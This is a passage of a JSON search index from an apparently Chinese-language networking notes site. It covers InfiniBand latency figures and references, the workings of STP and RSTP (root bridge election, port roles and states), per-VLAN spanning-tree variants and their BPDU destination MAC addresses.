\u200b\u53ef\u4ee5\u200b\u6d4b\u91cf\u200b\u5e26\u5bbd\u200b\u548c\u200b\u5ef6\u8fdf\u200b\u3002\u200b\u4e00\u4e2a\u200b\u6d4b\u8bd5\u200b\u4f8b\u5b50\u200b\uff1a</p> <ul> <li>\u200b\u4ee5\u592a\u7f51\u200b\uff08udp_lat\uff09\uff1a24.5 us</li> <li>IPoIB (udp_lat): 8.7 us</li> <li>IB (rc, ib_send_lat): 1.02 us</li> <li>IB (rc_lat): 3.6 ~ 4.6 us</li> <li>IB (uc_lat): 4.2 ~ 5.5 us</li> <li>IB (ud_lat): 5.5 ~ 6.4 us</li> </ul>"},{"location":"networking/infiniband.html#_3","title":"\u53c2\u8003\u6587\u732e","text":"<ul> <li>InfiniBand Architecture Overview</li> <li>InfiniBand Architecture Specification Volume 1 Release 1.2.1</li> <li>InfiniBand Architecture Specification Volume 2 Release 1.4</li> <li>An Introduction to the InfiniBand Architecture</li> <li>InfiniBand Network Architecture - MindShare</li> <li>ArchWiki - InfiniBand</li> </ul>"},{"location":"networking/spanning_tree_protocol.html","title":"STP \u200b\u534f\u8bae","text":""},{"location":"networking/spanning_tree_protocol.html#spanning-tree-protocol","title":"Spanning Tree Protocol","text":"<p>STP\uff08Spanning Tree Protocol\uff09\u200b\u53ef\u4ee5\u200b\u5728\u200b 802.1D-1998 \u200b\u7b2c\u200b 8 \u200b\u7ae0\u4e2d\u200b\u627e\u5230\u200b\u3002STP \u200b\u534f\u8bae\u200b\u5de5\u4f5c\u200b\u5728\u200b\u4ea4\u6362\u673a\u200b\u4e0a\u200b\uff0c\u200b\u9700\u8981\u200b\u6839\u636e\u200b\u4ea4\u6362\u673a\u200b\u8fde\u63a5\u200b\u7684\u200b\u62d3\u6251\u200b\uff0c\u200b\u81ea\u52a8\u200b\u8ba1\u7b97\u200b\u51fa\u200b\u4e00\u4e2a\u200b\u751f\u6210\u200b\u6811\u200b\uff0c\u200b\u5e76\u4e14\u200b\u628a\u200b\u4e0d\u200b\u5728\u200b\u751f\u6210\u200b\u6811\u4e0a\u200b\u7684\u200b\u8fb9\u200b\u7981\u7528\u200b\uff0c\u200b\u8fd9\u6837\u200b\u5373\u4f7f\u200b\u8fde\u63a5\u200b\u7684\u200b\u62d3\u6251\u200b\u6709\u200b\u73af\u8def\u200b\uff0c\u200b\u7981\u7528\u200b\u4ee5\u540e\u200b\u5c31\u200b\u6ca1\u6709\u200b\u73af\u200b\u4e86\u200b\u3002\u200b\u6709\u200b\u4e86\u200b STP \u200b\u4ee5\u540e\u200b\uff0c\u200b\u8fde\u63a5\u200b\u4ea4\u6362\u673a\u200b\u7684\u200b\u65f6\u5019\u200b\u5c31\u200b\u53ef\u4ee5\u200b\u523b\u610f\u200b\u8fde\u6210\u200b\u73af\u200b\uff0c\u200b\u4ece\u800c\u200b\u63d0\u4f9b\u200b\u5197\u4f59\u200b\u3002</p> <p>\u200b\u5728\u200b STP \u200b\u534f\u8bae\u200b\u63d0\u51fa\u200b\u7684\u200b\u65f6\u5019\u200b\uff0c\u200b\u7f51\u7edc\u200b\u8fd8\u200b\u4e0d\u200b\u50cf\u200b\u73b0\u5728\u200b\u8fd9\u6837\u200b\u4ee5\u200b\u70b9\u5bf9\u70b9\u200b\u4e3a\u4e3b\u200b\uff0c\u200b\u56e0\u6b64\u200b\u9700\u8981\u200b\u8003\u8651\u200b\u5171\u4eab\u200b\u4ecb\u8d28\u200b\u7684\u200b\u573a\u666f\u200b\uff0c\u200b\u4e5f\u200b\u5c31\u662f\u200b\u591a\u4e2a\u200b\u4ea4\u6362\u673a\u200b\u8fde\u200b\u5230\u200b\u540c\u4e00\u4e2a\u200b\u5c40\u57df\u7f51\u200b\uff0c\u200b\u5e76\u4e14\u200b\u8fd9\u4e2a\u200b\u5c40\u57df\u7f51\u200b\u901a\u8fc7\u200b Hub \u200b\u6765\u200b\u5171\u4eab\u200b\u4ecb\u8d28\u200b\u3002\u200b\u56e0\u6b64\u200b\uff0c\u200b\u5b9e\u9645\u4e0a\u200b\u5c40\u57df\u7f51\u200b\u4e5f\u200b\u5c5e\u4e8e\u200b\u62d3\u6251\u200b\u7684\u200b\u4e00\u90e8\u5206\u200b\uff0c\u200b\u5bf9\u5e94\u200b\u751f\u6210\u200b\u6811\u200b\u7684\u200b\u4e00\u4e2a\u200b\u7ed3\u70b9\u200b\u3002\u200b\u4e3a\u4e86\u200b\u7edf\u4e00\u200b\u70b9\u5bf9\u70b9\u200b\u548c\u200b\u5171\u4eab\u200b\u4ecb\u8d28\u200b\uff0c\u200b\u4e0d\u59a8\u200b\u8ba4\u4e3a\u200b\u70b9\u5bf9\u70b9\u200b\u8fde\u63a5\u200b\u4e2d\u200b\uff0c\u200b\u4e5f\u200b\u8fde\u63a5\u200b\u4e86\u200b\u4e00\u4e2a\u200b\u5171\u4eab\u200b\u4ecb\u8d28\u200b\u7684\u200b\u5c40\u57df\u7f51\u200b\uff0c\u200b\u53ea\u4e0d\u8fc7\u200b\u8fd9\u4e2a\u200b\u5c40\u57df\u7f51\u200b\u6ca1\u6709\u200b\u5176\u4ed6\u200b\u7f51\u7edc\u8bbe\u5907\u200b\u3002\u200b\u8fd9\u6837\u200b\u8bbe\u5b9a\u200b\u4ee5\u540e\u200b\uff0c\u200b\u4ece\u200b\u7f51\u7edc\u62d3\u6251\u200b\u4e0a\u200b\u6765\u770b\u200b\uff0c\u200b\u5c31\u662f\u200b\u5f88\u591a\u200b\u4e2a\u200b\u72ec\u7acb\u200b\u7684\u200b\u5c40\u57df\u7f51\u200b\uff0c\u200b\u7528\u200b\u4ea4\u6362\u673a\u200b\u8fde\u63a5\u8d77\u6765\u200b\u3002</p> <p>STP \u200b\u534f\u8bae\u200b\u5de5\u4f5c\u200b\u7684\u200b\u7b2c\u4e00\u6b65\u200b\u662f\u200b\u9009\u4e3e\u200b\u51fa\u200b\u4e00\u4e2a\u200b Root Bridge\uff0c\u200b\u4e5f\u200b\u5c31\u662f\u200b\u751f\u6210\u200b\u6811\u200b\u7684\u200b\u6839\u200b\u7ed3\u70b9\u200b\u3002\u200b\u4e3a\u4e86\u200b\u4fdd\u8bc1\u200b\u9009\u4e3e\u200b\u51fa\u200b\u552f\u4e00\u200b\u7684\u200b Root Bridge\uff0c\u200b\u9009\u62e9\u200b\u7684\u200b\u6807\u51c6\u200b\u662f\u200b\uff0c\u200b\u627e\u5230\u200b\u6700\u5c0f\u200b\u7684\u200b Bridge ID\uff0cID \u200b\u7531\u200b\u4eba\u4e3a\u200b\u8bbe\u5b9a\u200b\u7684\u200b\u4f18\u5148\u7ea7\u200b\u4ee5\u53ca\u200b MAC \u200b\u5730\u5740\u200b\u7ec4\u6210\u200b\u3002\u200b\u7531\u4e8e\u200b MAC \u200b\u5730\u5740\u200b\u662f\u200b\u552f\u4e00\u200b\u7684\u200b\uff0c\u200b\u6240\u4ee5\u200b Bridge ID \u200b\u4e5f\u200b\u662f\u200b\u552f\u4e00\u200b\u7684\u200b\uff0c\u200b\u56e0\u6b64\u200b\u4e00\u5b9a\u200b\u53ef\u4ee5\u200b\u627e\u5230\u200b\u4e00\u4e2a\u200b\u6700\u5c0f\u200b\u7684\u200b ID\uff0c\u200b\u90a3\u4e48\u200b\u5b83\u200b\u5bf9\u5e94\u200b\u7684\u200b Bridge \u200b\u5c31\u662f\u200b Root Bridge\u3002</p> <p>\u200b\u5b9e\u9645\u200b\u5de5\u4f5c\u200b\u7684\u200b\u65f6\u5019\u200b\uff0c\u200b\u4ea4\u6362\u200b\u673a\u4f1a\u200b\u6536\u53d1\u200b BPDU\uff0c\u200b\u5e76\u4e14\u200b\u628a\u200b\u5176\u4ed6\u200b\u4ea4\u6362\u673a\u200b\u53d1\u7ed9\u200b\u81ea\u5df1\u200b\u7684\u200b Root ID \u200b\u548c\u200b\u81ea\u5df1\u200b\u7684\u200b ID \u200b\u8fdb\u884c\u200b\u6bd4\u8f83\u200b\uff1a\u200b\u5982\u679c\u200b\u81ea\u5df1\u200b\u7684\u200b ID \u200b\u6bd4\u200b\u522b\u4eba\u200b\u53d1\u200b\u7684\u200b Root ID \u200b\u90fd\u200b\u5c0f\u200b\uff0c\u200b\u90a3\u4e48\u200b\u81ea\u5df1\u200b\u662f\u200b Root\uff1b\u200b\u5982\u679c\u200b\u522b\u4eba\u200b\u53d1\u200b\u7684\u200b Root ID \u200b\u6bd4\u200b\u81ea\u5df1\u200b\u5c0f\u200b\uff0c\u200b\u90a3\u200b\u81ea\u5df1\u200b\u80af\u5b9a\u200b\u4e0d\u662f\u200b Root\u3002\u200b\u7ecf\u8fc7\u200b\u4e00\u6bb5\u65f6\u95f4\u200b\uff0c\u200b\u62e5\u6709\u200b\u6700\u5c0f\u200b ID \u200b\u7684\u200b Bridge \u200b\u4fe1\u606f\u200b\u4f1a\u200b\u9010\u6e10\u200b\u4f20\u64ad\u200b\u5230\u200b\u6574\u4e2a\u200b\u7f51\u7edc\u200b\uff0c\u200b\u6700\u540e\u200b\u6240\u6709\u200b\u4ea4\u6362\u673a\u200b\u90fd\u200b\u4f1a\u200b\u5bf9\u200b Root Bridge \u200b\u8fbe\u6210\u200b\u5171\u8bc6\u200b\u3002</p> <p>\u200b\u786e\u5b9a\u200b\u597d\u200b Root Bridge \u200b\u4e4b\u540e\u200b\uff0c\u200b\u63a5\u4e0b\u6765\u200b\u5c31\u662f\u200b\u5f97\u5230\u200b\u751f\u6210\u200b\u6811\u200b\u3002\u200b\u6bcf\u4e2a\u200b\u4ea4\u6362\u200b\u673a\u4f1a\u200b\u63a5\u6536\u200b\u76f8\u90bb\u200b\u4ea4\u6362\u673a\u200b\u53d1\u9001\u200b\u7684\u200b BPDU\uff0c\u200b\u5f97\u77e5\u200b\u76f8\u90bb\u200b\u4ea4\u6362\u673a\u200b\u5230\u200b Root Bridge \u200b\u7684\u200b\u8ddd\u79bb\u200b\uff0c\u200b\u7136\u540e\u200b\u50cf\u200b\u8def\u7531\u200b\u534f\u8bae\u200b\u90a3\u6837\u200b\uff0c\u200b\u8ba1\u7b97\u200b\u51fa\u8d70\u200b\u4ece\u200b\u54ea\u4e2a\u200b Port \u200b\u8d70\u200b\u5230\u8fbe\u200b Root Bridge \u200b\u7684\u200b\u8ddd\u79bb\u200b\u6700\u77ed\u200b\uff0c\u200b\u5c31\u200b\u628a\u200b\u8fd9\u4e2a\u200b Port \u200b\u6807\u8bb0\u200b\u4e3a\u200b Root Port\uff0c\u200b\u610f\u601d\u200b\u662f\u200b\u6cbf\u7740\u200b\u8fd9\u4e2a\u200b\u65b9\u5411\u200b\u8d70\u200b\uff0c\u200b\u5c31\u200b\u4f1a\u200b\u4e00\u200b\u8df3\u200b\u4e00\u200b\u8df3\u200b\u5730\u200b\u5230\u8fbe\u200b Root Bridge\u3002\u200b\u540c\u65f6\u200b\u4e5f\u200b\u4f1a\u200b\u66f4\u65b0\u200b\u81ea\u5df1\u200b\u5230\u200b Root Bridge \u200b\u7684\u200b\u8ddd\u79bb\u200b\uff0c\u200b\u53d1\u7ed9\u200b\u76f8\u90bb\u200b\u7684\u200b\u4ea4\u6362\u673a\u200b\u3002\u200b\u8fd9\u4e9b\u200b Root Port \u200b\u7684\u200b\u65b9\u5411\u200b\u5c31\u200b\u5bf9\u5e94\u200b\u4e86\u200b\u751f\u6210\u200b\u6811\u200b\u91cc\u9762\u200b\u7684\u200b\u7236\u4eb2\u200b\u8282\u70b9\u200b\u3002</p> <p>\u200b\u5f97\u5230\u200b\u751f\u6210\u200b\u6811\u200b\u4ee5\u540e\u200b\uff0c\u200b\u5c31\u200b\u77e5\u9053\u200b\u5982\u4f55\u200b\u7981\u7528\u200b\u4e0d\u200b\u5728\u200b\u751f\u6210\u200b\u6811\u200b\u7684\u200b\u8fb9\u200b\u4e86\u200b\uff1a\u200b\u5982\u679c\u200b\u5728\u200b\u67d0\u4e2a\u200b\u975e\u200b Root \u200b\u7aef\u53e3\u200b\u4e0a\u200b\u76d1\u542c\u200b\u5230\u200b\u4e86\u200b\u5176\u4ed6\u200b\u4ea4\u6362\u673a\u200b\u53d1\u9001\u200b\u7684\u200b BPDU\uff0c\u200b\u90a3\u200b\u5c31\u200b\u8bf4\u660e\u200b\u4ea4\u6362\u673a\u200b\u5728\u200b\u8fd9\u4e2a\u200b\u7aef\u53e3\u200b\u65b9\u5411\u200b\u4e0a\u200b\u5b58\u5728\u200b\u4e00\u6761\u200b\u4e0d\u200b\u5728\u200b\u751f\u6210\u200b\u6811\u4e0a\u200b\u7684\u200b\u8fb9\u200b\u3002\u200b\u4f46\u662f\u200b\uff0c\u200b\u8fd9\u200b\u6761\u200b\u8fb9\u4e0a\u200b\u6709\u200b\u4e00\u4e2a\u200b\u5c40\u57df\u7f51\u200b\uff08\u200b\u524d\u9762\u200b\u63d0\u5230\u200b\uff0c\u200b\u5373\u4f7f\u200b\u662f\u200b\u4ea4\u6362\u673a\u200b\u4e4b\u95f4\u200b\u70b9\u5bf9\u70b9\u200b\u8fde\u63a5\u200b\uff0c\u200b\u4e5f\u200b\u53ef\u4ee5\u200b\u8ba4\u4e3a\u200b\u6709\u200b\u4e00\u4e2a\u200b\u6ca1\u6709\u200b\u7f51\u7edc\u8bbe\u5907\u200b\u7684\u200b\u5c40\u57df\u7f51\u200b\u5728\u200b\u4e2d\u95f4\u200b\uff09\uff0c\u200b\u8fd9\u4e2a\u200b\u5c40\u57df\u7f51\u200b\u4f9d\u7136\u200b\u9700\u8981\u200b\u80fd\u591f\u200b\u8bbf\u95ee\u200b\u5176\u4ed6\u200b\u5c40\u57df\u7f51\u200b\u3002\u200b\u56e0\u6b64\u200b\uff0c\u200b\u8fde\u63a5\u200b\u5230\u200b\u540c\u4e00\u4e2a\u200b\u5c40\u57df\u7f51\u200b\u7684\u200b\u591a\u4e2a\u200b\u4ea4\u6362\u673a\u200b\uff0c\u200b\u9700\u8981\u200b\u9009\u62e9\u200b\u51fa\u200b\u4e00\u4e2a\u200b\u4ea4\u6362\u673a\u200b\uff0c\u200b\u8d1f\u8d23\u200b\u8fd9\u4e2a\u200b\u5c40\u57df\u7f51\u200b\u7684\u200b\u6240\u6709\u200b\u6d41\u91cf\u200b\uff0c\u200b\u4e5f\u200b\u5c31\u662f\u200b Designated Bridge\u3002Designated Bridge \u200b\u8fde\u5411\u200b\u5c40\u57df\u7f51\u200b\u7684\u200b Port \u200b\u5c31\u662f\u200b Designated Port\u3002\u200b\u800c\u200b\u8fde\u63a5\u200b\u5230\u200b\u5c40\u57df\u7f51\u200b\u7684\u200b\u975e\u200b Designated Bridge\uff0c\u200b\u5c31\u200b\u9700\u8981\u200b\u7981\u7528\u200b\u7aef\u53e3\u200b\uff0c\u200b\u4e0d\u6536\u200b\u4e0d\u53d1\u200b\u6570\u636e\u200b\uff0c\u200b\u53ea\u200b\u5904\u7406\u200b BPDU\uff0c\u200b\u6b64\u65f6\u200b\u5c31\u662f\u200b Blocked Port\u3002</p> <p>\u200b\u56e0\u6b64\u200b\uff0c\u200b\u4ece\u200b\u4ea4\u6362\u673a\u200b\u7684\u200b\u89c6\u89d2\u200b\uff0c\u200b\u5982\u679c\u200b\u662f\u200b Root Bridge\uff0c\u200b\u770b\u5230\u200b\u7684\u200b\u5c31\u662f\u200b\u82e5\u5e72\u4e2a\u200b Designated Port\uff1b\u200b\u5982\u679c\u200b\u4e0d\u662f\u200b Root Bridge\uff0c\u200b\u90a3\u4e48\u200b\u4f1a\u200b\u770b\u5230\u200b\u4e00\u4e2a\u200b Root Port\uff0c\u200b\u82e5\u5e72\u4e2a\u200b Designated Port\uff0c\u200b\u53ef\u80fd\u200b\u8fd8\u6709\u200b Blocked Port\u3002</p> <p>\u200b\u9700\u8981\u200b\u533a\u5206\u200b\u4e24\u4e2a\u200b\u6982\u5ff5\u200b\uff1aRole \u200b\u548c\u200b State\u3002\u200b\u6bcf\u4e2a\u200b\u4ea4\u6362\u673a\u200b\u5728\u200b\u6bcf\u4e2a\u200b Port \u200b\u4e0a\u200b\uff0c\u200b\u90fd\u200b\u6709\u200b\u4e00\u4e2a\u200b Role \u200b\u548c\u200b\u4e00\u4e2a\u200b State\uff1a</p> <ul> <li>Role\uff1aRoot\uff0cDesignated\uff0cBlocked</li> <li>State\uff1aDisabled\uff0cBlocking\uff0cListening\uff0cLearning\uff0cForwarding</li> </ul> <p>Role \u200b\u6307\u200b\u7684\u200b\u662f\u200b\u7aef\u53e3\u200b\u7684\u200b\u5c5e\u6027\u200b\uff0c\u200b\u7528\u4e8e\u200b STP \u200b\u5185\u90e8\u200b\uff1a</p> <ul> <li>Root\uff1a\u200b\u8fde\u5411\u200b Root \u200b\u7684\u200b\u6700\u200b\u77ed\u200b\u8def\u5f84\u200b\u7684\u200b\u65b9\u5411\u200b</li> <li>Designated\uff1a\u200b\u8d1f\u8d23\u200b\u8f6c\u53d1\u200b\u5c40\u57df\u7f51\u200b\u6d41\u91cf\u200b</li> <li>Blocked\uff1a\u200b\u51fa\u73b0\u200b\u4e86\u200b\u73af\u200b\u5bfc\u81f4\u200b\u4e0d\u80fd\u200b\u8f6c\u53d1\u200b</li> </ul> <p>State \u200b\u6307\u200b\u7684\u200b\u662f\u200b\u7aef\u53e3\u200b\u7684\u200b\u72b6\u6001\u200b\uff0c\u200b\u53ef\u4ee5\u200b\u8ba4\u4e3a\u200b\u662f\u200b STP \u200b\u7684\u200b\u8f93\u51fa\u200b\uff0c\u200b\u628a\u200b\u7aef\u53e3\u200b\u8bbe\u7f6e\u200b\u4e3a\u200b\u5bf9\u5e94\u200b\u7684\u200b\u72b6\u6001\u200b\uff1a</p> <ul> <li>Blocking\uff1a\u200b\u4e0d\u200b\u8f6c\u53d1\u200b\u4ee5\u592a\u7f51\u200b\u5e27\u200b</li> <li>Listening\uff1a\u200b\u4e0d\u200b\u8f6c\u53d1\u200b\u4ee5\u592a\u7f51\u200b\u5e27\u200b\uff0c\u200b\u4f46\u662f\u200b\u6536\u53d1\u200b BPDU</li> <li>Learning\uff1a\u200b\u5728\u200b Listening \u200b\u7684\u200b\u57fa\u7840\u200b\u4e0a\u200b\uff0c\u200b\u76d1\u542c\u200b\u6d41\u91cf\u200b\uff0c\u200b\u5b66\u4e60\u200b MAC \u200b\u5730\u5740\u200b\uff0c\u200b\u6dfb\u52a0\u200b\u5230\u200b\u8f6c\u200b\u53d1\u8868\u200b</li> <li>Forwarding\uff1a\u200b\u6b63\u5e38\u200b\u5de5\u4f5c\u200b</li> <li>Disabled\uff1a\u200b\u88ab\u200b\u7ba1\u7406\u5458\u200b\u7981\u7528\u200b</li> </ul> <p>\u200b\u5c0f\u7ed3\u200b\u4e00\u4e0b\u200b STP \u200b\u7684\u200b\u5de5\u4f5c\u200b\u6d41\u7a0b\u200b\uff1a</p> <ol> <li>\u200b\u9009\u4e3e\u200b\u51fa\u200b Root Bridge</li> <li>\u200b\u5bf9\u4e8e\u200b\u6bcf\u4e2a\u200b LAN Segment\uff0c\u200b\u9009\u4e3e\u200b\u51fa\u200b Designated Switch</li> <li>\u200b\u628a\u200b\u4e0d\u200b\u5728\u200b\u751f\u6210\u200b\u6811\u4e0a\u200b\u7684\u200b\u7aef\u53e3\u200b\u8bbe\u7f6e\u200b\u4e3a\u200b Blocking</li> </ol>"},{"location":"networking/spanning_tree_protocol.html#rapid-spanning-tree-protocol","title":"Rapid Spanning Tree Protocol","text":"<p>RSTP\uff08Rapid Spanning Tree Protocol\uff09\u200b\u662f\u200b STP \u200b\u534f\u8bae\u200b\u7684\u200b\u5347\u7ea7\u200b\uff0c\u200b\u5728\u200b 802.1D-2004 \u200b\u6807\u51c6\u200b\u4e2d\u200b\u5b9a\u4e49\u200b\u3002</p> <p>\u200b\u548c\u200b STP \u200b\u4e0d\u540c\u200b\uff0cRSTP \u200b\u5b9a\u4e49\u200b\u4e86\u200b\u4e94\u4e2a\u200b Role\uff1a</p> <ul> <li>Root\uff1a\u200b\u8fde\u5411\u200b Root \u200b\u7684\u200b\u6700\u200b\u77ed\u200b\u8def\u5f84\u200b\u7684\u200b\u65b9\u5411\u200b</li> <li>Designated\uff1a\u200b\u8d1f\u8d23\u200b\u8f6c\u53d1\u200b\u5c40\u57df\u7f51\u200b\u6d41\u91cf\u200b</li> <li>Alternate\uff1a\u200b\u8fde\u5411\u200b Root \u200b\u7684\u200b\u53e6\u200b\u4e00\u6761\u200b\u8def\u5f84\u200b\u7684\u200b\u65b9\u5411\u200b</li> <li>Backup\uff1a\u200b\u5df2\u7ecf\u200b\u6709\u200b\u53e6\u200b\u4e00\u4e2a\u200b\u4ea4\u6362\u673a\u200b\u8fde\u63a5\u200b\u7684\u200b\u5c40\u57df\u7f51\u200b\u65b9\u5411\u200b</li> <li>Disabled\uff1a\u200b\u88ab\u200b\u7ba1\u7406\u5458\u200b\u7981\u7528\u200b</li> </ul> <p>\u200b\u9664\u4e86\u200b Disabled \u200b\u4ee5\u5916\u200b\uff0cRSTP \u200b\u548c\u200b STP \u200b\u7684\u200b\u533a\u522b\u200b\u5728\u4e8e\u200b\uff0cRSTP \u200b\u628a\u200b Blocked \u200b\u6539\u6210\u200b\u4e86\u200b Alternate \u200b\u548c\u200b Backup\uff1a</p> <ul> <li>Alternate \u200b\u4f5c\u4e3a\u200b Root \u200b\u7684\u200b\u5907\u4efd\u200b\uff1a\u200b\u8bb0\u5f55\u200b\u4ea4\u6362\u673a\u200b\u5230\u200b Root \u200b\u7684\u200b\u7b2c\u4e8c\u6761\u200b\u8def\u5f84\u200b\uff0c\u200b\u5f53\u200b Root Port \u200b\u51fa\u200b\u95ee\u9898\u200b\u4e86\u200b\uff0c\u200b\u90a3\u4e48\u200b Alternate Port \u200b\u53ef\u4ee5\u200b\u6210\u4e3a\u200b\u65b0\u200b\u7684\u200b Root Port</li> <li>Backup \u200b\u4f5c\u4e3a\u200b Designated \u200b\u7684\u200b\u5907\u4efd\u200b\uff1a\u200b\u8fde\u63a5\u200b\u7684\u200b\u5c40\u57df\u7f51\u200b\u6709\u200b\u522b\u7684\u200b Designated Bridge\uff0c\u200b\u5982\u679c\u200b Designated Bridge \u200b\u51fa\u200b\u95ee\u9898\u200b\u4e86\u200b\uff0c\u200b\u81ea\u5df1\u200b\u53ef\u4ee5\u200b\u6210\u4e3a\u200b\u65b0\u200b\u7684\u200b Designated Bridge</li> </ul> <p>\u200b\u8fd9\u6837\u200b\u7684\u200b\u597d\u5904\u200b\u662f\u200b\uff0c\u200b\u5982\u679c\u200b Root Port \u200b\u51fa\u200b\u95ee\u9898\u200b\u4e86\u200b\uff0c\u200b\u53ef\u4ee5\u200b\u53ca\u65f6\u200b\u5207\u6362\u200b\u5230\u200b\u522b\u7684\u200b\u8def\u5f84\u200b\u4e0a\u200b\uff0c\u200b\u63d0\u9ad8\u200b\u6536\u655b\u200b\u901f\u5ea6\u200b\u3002</p> <p>\u200b\u76f8\u6bd4\u200b STP\uff0cRSTP \u200b\u628a\u200b State \u200b\u7b80\u5316\u200b\u6210\u200b\u4e86\u200b\u4e09\u4e2a\u200b\uff1a</p> <ul> <li>Discarding\uff1a\u200b\u4e0d\u200b\u8f6c\u53d1\u200b\u4ee5\u592a\u7f51\u200b\u5e27\u200b\uff0c\u200b\u5bf9\u5e94\u200b STP \u200b\u7684\u200b Blocking \u200b\u548c\u200b Listening</li> <li>Learning\uff1a\u200b\u4e0d\u200b\u8f6c\u53d1\u200b\u4ee5\u592a\u7f51\u200b\u5e27\u200b\uff0c\u200b\u5b66\u4e60\u200b MAC \u200b\u5730\u5740\u200b</li> <li>Forwarding\uff1a\u200b\u6b63\u5e38\u200b\u5de5\u4f5c\u200b</li> </ul>"},{"location":"networking/spanning_tree_protocol.html#stp-vlan","title":"STP \u200b\u4e0e\u200b VLAN","text":"<p>STP \u200b\u548c\u200b RSTP \u200b\u90fd\u200b\u6ca1\u6709\u200b\u8003\u8651\u200b VLAN\uff0c\u200b\u53ea\u200b\u8003\u8651\u200b\u4e86\u200b\u4ea4\u6362\u673a\u200b\u7684\u200b\u62d3\u6251\u200b\u3002\u200b\u4f46\u200b\u5b9e\u9645\u4e0a\u200b\uff0c\u200b\u6bcf\u4e2a\u200b VLAN \u200b\u53ef\u80fd\u200b\u662f\u200b\u4e0d\u540c\u200b\u7684\u200b\u4e00\u4e2a\u200b\u62d3\u6251\u200b\uff0c\u200b\u53ef\u80fd\u200b\u53ea\u6709\u200b\u90e8\u5206\u200b\u4ea4\u6362\u673a\u200b\u53c2\u4e0e\u200b\u5230\u200b\u7279\u5b9a\u200b\u7684\u200b VLAN \u200b\u4e2d\u200b\uff0c\u200b\u8fd9\u65f6\u5019\u200b\u5c31\u200b\u5e0c\u671b\u200b\u53ef\u4ee5\u200b\u505a\u200b\u4e00\u4e2a\u200b Per VLAN \u200b\u7684\u200b STP\u3002</p> <p>Per VLAN \u200b\u7684\u200b STP \u200b\u76f8\u5173\u200b\u534f\u8bae\u200b\u6709\u200b\uff1a</p> <ul> <li>STP + VLAN: Per-VLAN Spanning Tree(PVST/PVST+) by Cisco</li> <li>STP + VLAN: Spanning Tree Per VLAN(STP-PV) by Dell</li> <li>RSTP + VLAN: Rapid Per-VLAN Spanning Tree(Rapid PVST/Rapid PVST+) by Cisco</li> <li>RSTP + VLAN: Vlan-based Spanning Tree(VBST) by Huawei</li> <li>RSTP + VLAN: Rapid Spanning Tree Per VLAN(RSTP-PV) by Dell</li> </ul> <p>\u200b\u8fd9\u4e9b\u200b\u534f\u8bae\u200b\u5927\u591a\u200b\u662f\u200b\u517c\u5bb9\u200b\u7684\u200b\uff0c\u200b\u867d\u7136\u200b\u540d\u5b57\u200b\u4e0d\u540c\u200b\uff0c\u200b\u4f46\u200b\u5927\u200b\u6982\u7387\u200b\u662f\u200b\u4e00\u6837\u200b\u7684\u200b\u534f\u8bae\u200b\u3002\u200b\u5728\u200b Dell \u200b\u7684\u200b\u6587\u6863\u200b\u4e2d\u200b\uff0c\u200b\u6709\u200b\u6bd4\u8f83\u200b\u5177\u4f53\u200b\u7684\u200b Per VLAN STP \u200b\u7684\u200b\u5b9e\u73b0\u200b\u65b9\u6cd5\u200b\uff1a</p> <ul> <li>VLAN Access \u200b\u7aef\u53e3\u200b\uff1a\u200b\u6b64\u65f6\u200b\u53ea\u6709\u200b\u4e00\u4e2a\u200b VLAN\uff0c\u200b\u5e76\u4e14\u200b\u662f\u200b untagged\uff0c\u200b\u8fd0\u884c\u200b\u6b63\u5e38\u200b\u7684\u200b STP/RSTP \u200b\u534f\u8bae\u200b</li> <li>VLAN Trunk \u200b\u7aef\u53e3\u200b\uff0c\u200b\u4e14\u200b Native VLAN \u200b\u662f\u200b VLAN 1\uff1a<ul> <li>VLAN 1 \u200b\u7684\u200b STP BPDU \u200b\u4f1a\u200b untagged \u200b\u53d1\u9001\u5230\u200b 01:80:c2:00:00:00 \u200b\u548c\u200b 01:00:0c:cc:cc:cd</li> <li>\u200b\u5176\u4ed6\u200b VLAN \u200b\u7684\u200b STP BPDU \u200b\u4f1a\u200b tagged \u200b\u53d1\u9001\u5230\u200b 01:00:0c:cc:cc:cd</li> </ul> </li> <li>VLAN Trunk \u200b\u7aef\u53e3\u200b\uff0c\u200b\u4e14\u200b Native VLAN \u200b\u4e0d\u662f\u200b VLAN 1\uff1a<ul> <li>VLAN 1 \u200b\u7684\u200b STP BPDU \u200b\u4f1a\u200b untagged \u200b\u53d1\u9001\u5230\u200b 01:80:c2:00:00:00</li> <li>VLAN 1 \u200b\u7684\u200b STP BPDU \u200b\u4f1a\u200b tagged \u200b\u53d1\u9001\u5230\u200b 01:00:0c:cc:cc:cd</li> <li>\u200b\u5176\u4ed6\u200b VLAN \u200b\u7684\u200b STP BPDU \u200b\u4f1a\u200b tagged \u200b\u53d1\u9001\u5230\u200b 01:00:0c:cc:cc:cd</li> </ul> </li> </ul> <p>\u200b\u5176\u4e2d\u200b 01:80:c2:00:00:00 \u200b\u662f\u200b STP \u200b\u6807\u51c6\u200b\u7684\u200b\u76ee\u7684\u200b MAC \u200b\u5730\u5740\u200b\uff0c\u200b\u6807\u51c6\u200b\u4e2d\u200b\u79f0\u4e4b\u4e3a\u200b Bridge Group Address\uff0c\u200b\u4e5f\u200b\u5c31\u662f\u200b\u6240\u6709\u200b Bridge \u200b\u8981\u200b\u63a5\u6536\u200b\u7684\u200b MAC \u200b\u5730\u5740\u200b\u3002\u200b\u800c\u200b 01:00:0c:cc:cc:cd \u200b\u662f\u200b SSTP(Shared Spanning Tree Protocol) \u200b\u7684\u200b\u76ee\u7684\u200b MAC \u200b\u5730\u5740\u200b\uff0c\u200b\u5e76\u975e\u200b\u6807\u51c6\u200b STP\u3002\u200b\u8fd9\u6837\u200b\u7684\u200b\u8bbe\u8ba1\u200b\u4fdd\u8bc1\u200b\u4e86\u200b\u603b\u4f1a\u200b\u53d1\u9001\u200b\u4e00\u4efd\u200b untagged BPDU \u200b\u5230\u200b\u6807\u51c6\u200b Bridge Group Address\uff0c\u200b\u4fdd\u8bc1\u200b\u4e86\u200b\u5bf9\u200b\u65e7\u200b\u534f\u8bae\u200b\u7684\u200b\u517c\u5bb9\u6027\u200b\u3002</p> <p>\u200b\u6b64\u5916\u200b\u8fd8\u6709\u200b Multiple Spanning Tree Protocol(MSTP)\uff0c\u200b\u5b9a\u4e49\u200b\u5728\u200b IEEE 802.1s-2002 \u200b\u6807\u51c6\u200b\u4e2d\u200b\uff0c\u200b\u5b83\u200b\u5e76\u200b\u4e0d\u662f\u200b Per-VLAN Spanning Tree\uff0c\u200b\u800c\u200b\u652f\u6301\u200b\u8de8\u200b VLAN \u200b\u7684\u200b\u751f\u6210\u200b\u6811\u200b\u8ba1\u7b97\u200b\u3002</p> 